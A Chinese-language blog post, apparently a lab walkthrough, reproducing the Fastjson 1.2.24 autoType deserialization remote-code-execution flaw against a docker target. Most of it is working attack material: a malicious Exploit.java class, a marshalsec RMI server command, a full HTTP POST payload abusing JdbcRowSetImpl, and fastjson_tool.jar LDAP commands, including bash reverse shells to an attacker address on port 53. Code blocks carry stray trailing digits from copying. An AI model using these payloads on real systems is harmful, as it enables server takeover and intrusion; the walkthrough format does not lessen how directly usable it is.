**目录**

[Fastjson](#t0 "Fastjson")

[autoType](#t1 "autoType")

[fastjson1.2.24反序列化漏洞复现一](#t2 "fastjson1.2.24反序列化漏洞复现一")

[编译恶意类](#t3 "编译恶意类")

[起HTTP服务](#t4 "起HTTP服务")

[起RMI服务](#t5 "起RMI服务")

[数据包攻击](#t6 "数据包攻击")

[脚本攻击](#t7 "脚本攻击")

[反弹shell](#t8 "反弹shell")

[fastjson1.2.24反序列化漏洞复现二](#t9 "fastjson1.2.24反序列化漏洞复现二")

* * *

Fastjson
========

[Fastjson](https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020)是一个阿里巴巴开源的一款使用Java语言编写的高性能功能完善的JSON库，通常被用于将Java Bean和JSON 字符串之间进行转换。它采用一种“假定有序快速匹配”的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。但是，从诞生之初，fastjson就多次被爆出存在反序列化漏洞。并且，每次都和autoType有关！那么，什么是autoType呢？

autoType
--------

fastjson的主要功能就是将Java Bean[序列化](https://so.csdn.net/so/search?q=%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。

但是，fastjson在序列化以及[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。

其实，对于JSON框架来说，想要把一个Java对象转换成[字符串](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)，可以有两种选择：

*   1：基于属性
*   2：基于setter/getter

而我们所常用的JSON序列化框架中，FastJson和jackson在把对象序列化成json字符串的时候，是通过遍历出该类中的所有getter方法进行的。Gson并不是这么做的，他是通过反射遍历该类中的所有属性，并把其值序列化成json。

关于autoType详细介绍，有一篇文章写得非常好：[fastjson到底做错了什么？为什么会被频繁爆出漏洞？](https://zhuanlan.zhihu.com/p/157211675?from_voters_page=true "fastjson到底做错了什么？为什么会被频繁爆出漏洞？")

fastjson1.2.24反序列化漏洞复现一
-----------------------

使用docker搭建靶机环境，访问目标，如下

![](https://img-blog.csdnimg.cn/20201209221146692.png)

我们向这个地址POST一个JSON对象，即可更新服务器端的信息

![](https://img-blog.csdnimg.cn/20201209221319599.png)

### 编译恶意类

首先编译如下Exploit.java代码为class

```
import java.io.BufferedReader;      
import java.io.InputStream;      
import java.io.InputStreamReader;       
public class Exploit{      
    public Exploit() throws Exception {      
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "touch /tmp/success"});      
        InputStream is = p.getInputStream();      
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));       1
        String line;      1
        while((line = reader.readLine()) != null) {      1
            System.out.println(line);      1
        }       1
        p.waitFor();      1
        is.close();      1
        reader.close();      1
        p.destroy();      2
    }       2
    public static void main(String[] args) throws Exception {      2
    }      2
}
```


![](https://img-blog.csdnimg.cn/20201209223946874.png)

### 起HTTP服务

然后用python起一个http服务

![](https://img-blog.csdnimg.cn/20201209224006232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 起RMI服务

最后，我们使用marshalsec-0.0.3-SNAPSHOT-all.jar起一个RMI服务器，监听9999端口，并制定加载远程类 Exploit.class

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:11111/#Exploit" 9999
```


![](https://img-blog.csdnimg.cn/20201209224358839.png)

### 数据包攻击

提交如下payload

```
POST / HTTP/1.1      
Host: xx.xx.xx.xx:8090      
Accept-Encoding: gzip, deflate      
Accept: */*      
Accept-Language: en      
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)      
Connection: close      
Content-Type: application/json      
Content-Length: 161       1
{      1
    "b":{      1
        "@type":"com.sun.rowset.JdbcRowSetImpl",      1
        "dataSourceName":"rmi://VPS ip地址:9999/Exploit",      1
        "autoCommit":true      1
    }      1
}
```


![](https://img-blog.csdnimg.cn/20201209224920378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到我们这边监听也收到了请求

![](https://img-blog.csdnimg.cn/20201209225038782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

上靶标tmp目录查看，可以看到生成了success文件

![](https://img-blog.csdnimg.cn/20201209225143217.png)

### 脚本攻击

也可以直接使用脚本攻击

![](https://img-blog.csdnimg.cn/20201209225748968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反弹shell

如果是直接反弹shell的话，Exploit.java就得修改为反弹shell的命令了

```
import java.io.BufferedReader;      
import java.io.InputStream;      
import java.io.InputStreamReader;       
public class Exploit{      
    public Exploit() throws Exception {      
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/xx.xx.xx.xx/53 0>&1"});      
        InputStream is = p.getInputStream();      
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));       1
        String line;      1
        while((line = reader.readLine()) != null) {      1
            System.out.println(line);      1
        }       1
        p.waitFor();      1
        is.close();      1
        reader.close();      1
        p.destroy();      2
    }       2
    public static void main(String[] args) throws Exception {      2
    }      2
}
```


![](https://img-blog.csdnimg.cn/20201209230210455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

fastjson1.2.24反序列化漏洞复现二
-----------------------

这次我们使用fastjson\_tool.jar工具来进行攻击 。该工具整合了RMI / LADP + 命令执行。

```
LDAP：java -cp fastjson_tool.jar fastjson.HLDAPServer VPS公网ip地址 监听的端口 "命令"      
RMI： java -cp fastjson_tool.jar fastjson.HRMIServer  VPS公网ip地址 监听的端口 "命令"
```


但是笔者在测试RMI的时候，不能稳定复现，故使用LDAP复现。

```
java -cp fastjson_tool.jar fastjson.HLDAPServer VPS公网ip地址 9999 "touch /tmp/success"
```


直接使用脚本进行攻击

![](https://img-blog.csdnimg.cn/20201209232732920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**反弹shell**

```
java -cp fastjson_tool.jar fastjson.HLDAPServer VPS的公网地址 9999 "bash=/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/53 0>&1"
```


![](https://img-blog.csdnimg.cn/20201209233215977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

参考文章：[fastjson到底做错了什么？为什么会被频繁爆出漏洞？](https://zhuanlan.zhihu.com/p/157211675?from_voters_page=true "fastjson到底做错了什么？为什么会被频繁爆出漏洞？")

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)